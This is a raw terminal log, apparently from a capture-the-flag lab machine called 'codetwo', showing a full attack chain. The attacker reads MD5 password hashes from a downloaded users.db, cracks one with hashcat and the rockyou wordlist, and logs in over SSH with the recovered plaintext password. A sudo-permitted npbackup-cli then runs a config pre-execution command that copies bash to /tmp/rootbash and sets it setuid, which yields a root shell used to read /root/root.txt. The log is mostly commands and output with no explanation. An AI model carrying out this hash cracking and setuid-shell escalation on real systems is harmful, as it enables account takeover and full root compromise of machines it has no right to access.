@@ -1,0 +1,469 @@
+
+
+on port 9999
+
+┌──(kali㉿kali)-[~]
+└─$ cat /home/kali/Downloads/users.db
+�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
+        id INTEGER NOT NULL, 
+        user_id INTEGER NOT NULL, 
+        code TEXT NOT NULL, 
+        PRIMARY KEY (id), 
+        FOREIGN KEY(user_id) REFERENCES user (id)
+)�0�CtableuseruserCREATE TABLE user (
+        id INTEGER NOT NULL, 
+        username VARCHAR(80) NOT NULL, 
+        password_hash VARCHAR(128) NOT NULL, 
+        PRIMARY KEY (id), 
+        UNIQUE (username)
+���'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+┌──(kali㉿kali)-[~]
+└─$ cat /home/kali/Downloads/users.db
+�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
+        id INTEGER NOT NULL, 
+        user_id INTEGER NOT NULL, 
+        code TEXT NOT NULL, 
+        PRIMARY KEY (id), 
+        FOREIGN KEY(user_id) REFERENCES user (id)
+)�0�CtableuseruserCREATE TABLE user (
+        id INTEGER NOT NULL, 
+        username VARCHAR(80) NOT NULL, 
+        password_hash VARCHAR(128) NOT NULL, 
+        PRIMARY KEY (id), 
+        UNIQUE (username)
+���'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ echo "97588c0e2fa3a024876339e27aeb42e" > hash.txt
+echo "649c9d65a206a75f5abe509fe128bce5" >> hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-penryn-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 1438/2941 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashfile 'hash.txt' on line 1 (97588c0e2fa3a024876339e27aeb42e): Token length exception
+
+* Token length exception: 1/2 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username option is used but no username is present)
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+
+
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove       
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 649c9d65a206a75f5abe509fe128bce5
+Time.Started.....: Sun Aug 17 03:10:13 2025 (3 secs)
+Time.Estimated...: Sun Aug 17 03:10:16 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1701.0 kH/s (0.07ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3449088/14344385 (24.04%)
+Rejected.........: 0/3449088 (0.00%)
+Restore.Point....: 3448320/14344385 (24.04%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: sweetboy9 -> sweet_12
+Hardware.Mon.#1..: Util: 38%
+
+Started: Sun Aug 17 03:09:58 2025
+Stopped: Sun Aug 17 03:10:17 2025
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+┌──(kali㉿kali)-[~]
+└─$ ssh marco@10.10.11.82        
+The authenticity of host '10.10.11.82 (10.10.11.82)' can't be established.
+ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.82' (ED25519) to the list of known hosts.
+marco@10.10.11.82's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun 17 Aug 2025 07:33:48 AM UTC
+
+  System load:           0.0
+  Usage of /:            58.7% of 5.08GB
+  Memory usage:          25%
+  Swap usage:            0%
+  Processes:             227
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.82
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:784b
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun Aug 17 07:33:49 2025 from 10.10.14.16
+marco@codetwo:~$ 
+
+marco@codetwo:~$ sudo -l
+Matching Defaults entries for marco on codetwo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codetwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+marco@codetwo:~$ cat /usr/local/bin/npbackup-cli
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+import re
+import sys
+from npbackup.__main__ import main
+if __name__ == '__main__':
+    # Block restricted flag
+    if '--external-backend-binary' in sys.argv:
+        print("Error: '--external-backend-binary' flag is restricted for use.")
+        sys.exit(1)
+
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+marco@codetwo:~$ 
+marco@codetwo:~$ 
+
+
+
+marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli
+2025-08-17 07:44:20,841 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2025-08-17 07:44:20,842 :: CRITICAL :: Cannot run without configuration file.
+2025-08-17 07:44:20,849 :: INFO :: ExecTime = 0:00:00.009857, finished, state is: critical.
+marco@codetwo:~$ 
+
+
+marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli --help
+usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE]
+                    [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy] [--housekeeping] [--quick-check]
+                    [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index]
+                    [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST]
+                    [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]
+                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin]
+                    [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache] [--license]
+                    [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
+                    [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION]
+                    [--create-key CREATE_KEY] [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
+                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]
+                    [--check-config-file]
+
+Portable Network Backup Client This program is distributed under the GNU General Public License and comes with
+ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions;
+Please type --license for more info.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c CONFIG_FILE, --config-file CONFIG_FILE
+                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
+  --repo-name REPO_NAME
+                        Name of the repository to work with. Defaults to 'default'. This can also be a comma
+                        separated list of repo names. Can accept special name '__all__' to work with all
+                        repositories.
+  --repo-group REPO_GROUP
+                        Comme separated list of groups to work with. Can accept special name '__all__' to work
+                        with all repositories.
+  -b, --backup          Run a backup
+  -f, --force           Force running a backup regardless of existing backups age
+  -r RESTORE, --restore RESTORE
+                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than
+                        latest
+  -s, --snapshots       Show current snapshots
+  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
+  --find FIND           Find full path of given file / directory
+  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
+  --policy              Apply retention policy to snapshots (forget snapshots)
+  --housekeeping        Run --check quick, --policy and --prune in one go
+  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
+  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
+  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata +
+                        data check)
+  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum
+                        space
+  --prune-max           Deprecated in favor of --prune max
+  --unlock              Unlock repository
+  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
+  --repair-packs REPAIR_PACKS
+                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
+  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
+  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
+  --recover             Recover lost repo snapshots
+  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
+  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add
+                        --snapshot-id to specify a snapshot other than latest
+  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be
+                        shown. You may also pass "--mode raw-data" or "--mode debug" (with double quotes) to get
+                        full repo statistics
+  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
+  --init                Manually initialize a repo (is done automatically on first backup)
+  --has-recent-snapshot
+                        Check if a recent snapshot exists
+  --restore-includes RESTORE_INCLUDES
+                        Restore only paths within include path, comma separated list accepted
+  --snapshot-id SNAPSHOT_ID
+                        Choose which snapshot to use. Defaults to latest
+  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
+  --stdin               Backup using data from stdin input
+  --stdin-filename STDIN_FILENAME
+                        Alternate filename for stdin, defaults to 'stdin.data'
+  -v, --verbose         Show verbose output
+  -V, --version         Show program version
+  --dry-run             Run operations in test mode, no actual modifications
+  --no-cache            Run operations without cache
+  --license             Show license
+  --auto-upgrade        Auto upgrade NPBackup
+  --log-file LOG_FILE   Optional path for logfile
+  --show-config         Show full inherited configuration for current repo. Optionally you can set
+                        NPBACKUP_MANAGER_PASSWORD env variable for more details.
+  --external-backend-binary EXTERNAL_BACKEND_BINARY
+                        Full path to alternative external backend binary
+  --group-operation GROUP_OPERATION
+                        Deprecated command to launch operations on multiple repositories. Not needed anymore.
+                        Replaced by --repo-name x,y or --repo-group x,y
+  --create-key CREATE_KEY
+                        Create a new encryption key, requires a file path
+  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
+                        Create a scheduled backup task, specify an argument interval via interval=minutes, or
+                        hour=hour,minute=minute for a daily task
+  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
+                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
+  --check-config-file   Check if config file is valid
+marco@codetwo:~$ 
+
+
+
+marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c ~/mynpbackup.conf --backup
+2025-08-17 08:54:18,584 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2025-08-17 08:54:18,593 :: INFO :: Loaded config 321F6806 in /home/marco/mynpbackup.conf
+2025-08-17 08:54:18,594 :: INFO :: Encrypting non encrypted data in configuration file
+2025-08-17 08:54:18,594 :: INFO :: No groups found in config
+2025-08-17 08:54:18,594 :: INFO :: Updating config file
+2025-08-17 08:54:18,595 :: ERROR :: Program interrupted by error: 'NoneType' object has no attribute 'keys'
+2025-08-17 08:54:18,595 :: INFO :: Trace:
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/__main__.py", line 816, in main
+    cli_interface()
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/__main__.py", line 404, in cli_interface
+    full_config = npbackup.configuration.load_config(config_file)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 941, in load_config
+    save_config(config_file, full_config)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 947, in save_config
+    full_config = inject_permissions_into_full_config(full_config)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 540, in inject_permissions_into_full_config
+    for object_name in full_config.g(object_type).keys():
+AttributeError: 'NoneType' object has no attribute 'keys'
+2025-08-17 08:54:18,602 :: INFO :: ExecTime = 0:00:00.020175, finished, state is: errors.
+marco@codetwo:~$ rm mynpbackup.conf
+marco@codetwo:~$ nano mynpbackup.conf
+marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c ~/mynpbackup.conf --backup
+2025-08-17 08:55:01,964 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2025-08-17 08:55:01,972 :: INFO :: Loaded config 40F19FEF in /home/marco/mynpbackup.conf
+2025-08-17 08:55:01,973 :: INFO :: Encrypting non encrypted data in configuration file
+2025-08-17 08:55:01,973 :: INFO :: Updating config file
+2025-08-17 08:55:01,980 :: INFO :: Saved configuration file /home/marco/mynpbackup.conf
+2025-08-17 08:55:01,984 :: INFO :: No minimal backup age set set.
+2025-08-17 08:55:01,984 :: INFO :: Searching for a backup newer than 0:00:00 ago
+2025-08-17 08:55:01,984 :: INFO :: No recent backup found in repo default. Newest is from None
+2025-08-17 08:55:01,984 :: INFO :: Runner took 0.000568 seconds for has_recent_snapshot
+2025-08-17 08:55:01,984 :: INFO :: Running backup of ['/home/app/app/'] to repo default
+2025-08-17 08:55:02,046 :: INFO :: Pre-execution of command /bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' succeeded with:
+None
+2025-08-17 08:55:02,064 :: INFO :: Repository is not initialized or accessible
+2025-08-17 08:55:02,065 :: INFO :: Repo is not initialized. Initializing repo for backup operation
+created restic repository 185b5ee58e at dummy
+
+Please note that knowledge of your password is required to access
+the repository. Losing your password means that your data is
+irrecoverably lost.
+2025-08-17 08:55:04,281 :: INFO :: Repo initialized successfully
+no parent snapshot found, will read all files
+
+Files:          12 new,     0 changed,     0 unmodified
+Dirs:            9 new,     0 changed,     0 unmodified
+Added to the repository: 56.154 KiB (22.938 KiB stored)
+
+processed 12 files, 48.910 KiB in 0:00
+snapshot 117ecb0b saved
+2025-08-17 08:55:05,088 :: INFO :: Backend finished with success
+2025-08-17 08:55:05,090 :: ERROR :: Runner: Function backup failed with: 
+2025-08-17 08:55:05,090 :: ERROR :: Trace:
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 83, in g
+    return self.mlget(path.split(sep), default=default, list_ok=list_ok)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 843, in mlget
+    return get_one_level(key, 1, self)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 840, in get_one_level
+    return get_one_level(key_list, level + 1, d[key_list[level - 1]])
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 835, in get_one_level
+    assert isinstance(d, dict)
+AssertionError
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 698, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 496, in wrapper
+    result = fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 674, in wrapper
+    result = fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 625, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 566, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 647, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 1504, in backup
+    analyser_result, backup_too_small = metric_analyser(
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 97, in metric_analyser
+    if repo_config.g("prometheus.metrics"):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 88, in g
+    raise AssertionError from exc
+AssertionError
+2025-08-17 08:55:05,098 :: ERROR :: Program interrupted by error: 
+2025-08-17 08:55:05,098 :: INFO :: Trace:
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 83, in g
+    return self.mlget(path.split(sep), default=default, list_ok=list_ok)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 843, in mlget
+    return get_one_level(key, 1, self)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 840, in get_one_level
+    return get_one_level(key_list, level + 1, d[key_list[level - 1]])
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 835, in get_one_level
+    assert isinstance(d, dict)
+AssertionError
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 698, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 496, in wrapper
+    result = fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 674, in wrapper
+    result = fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 625, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 566, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 647, in wrapper
+    return fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 1504, in backup
+    analyser_result, backup_too_small = metric_analyser(
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 97, in metric_analyser
+    if repo_config.g("prometheus.metrics"):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 88, in g
+    raise AssertionError from exc
+AssertionError
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 83, in g
+    return self.mlget(path.split(sep), default=default, list_ok=list_ok)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 843, in mlget
+    return get_one_level(key, 1, self)
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 840, in get_one_level
+    return get_one_level(key_list, level + 1, d[key_list[level - 1]])
+  File "/usr/local/lib/python3.8/dist-packages/ruamel/yaml/comments.py", line 835, in get_one_level
+    assert isinstance(d, dict)
+AssertionError
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/__main__.py", line 816, in main
+    cli_interface()
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/__main__.py", line 792, in cli_interface
+    entrypoint(**cli_args)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/runner_interface.py", line 60, in entrypoint
+    result = npbackup_runner.__getattribute__(operation)(
+  File "/usr/local/lib/python3.8/dist-packages/ofunctions/threading/__init__.py", line 112, in wrapper
+    return fn(*args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 526, in wrapper
+    result = fn(self, *args, **kwargs)
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 713, in wrapper
+    metric_analyser(
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 97, in metric_analyser
+    if repo_config.g("prometheus.metrics"):
+  File "/usr/local/lib/python3.8/dist-packages/npbackup/configuration.py", line 88, in g
+    raise AssertionError from exc
+AssertionError
+2025-08-17 08:55:05,108 :: INFO :: ExecTime = 0:00:03.146567, finished, state is: errors.
+marco@codetwo:~$ ls -l /tmp/rootbash
+-rwsr-sr-x 1 root root 1183448 Aug 17 08:55 /tmp/rootbash
+marco@codetwo:~$ /tmp/rootbash -p
+rootbash-5.0# ls -la
+total 52
+drwxr-x--- 7 marco marco 4096 Aug 17 08:55 .
+drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
+drwx------ 7 root  root  4096 Apr  6 03:50 backups
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
+drwx------ 2 marco marco 4096 Apr  6 04:02 .cache
+drwx------ 7 root  root  4096 Aug 17 08:55 dummy
+drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
+-rw-rw-r-- 1 marco marco  764 Aug 17 08:55 mynpbackup.conf
+lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
+-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
+-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
+lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
+drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
+-rw-r----- 1 root  marco   33 Aug 16 18:58 user.txt
+rootbash-5.0# cat /root/root.txt
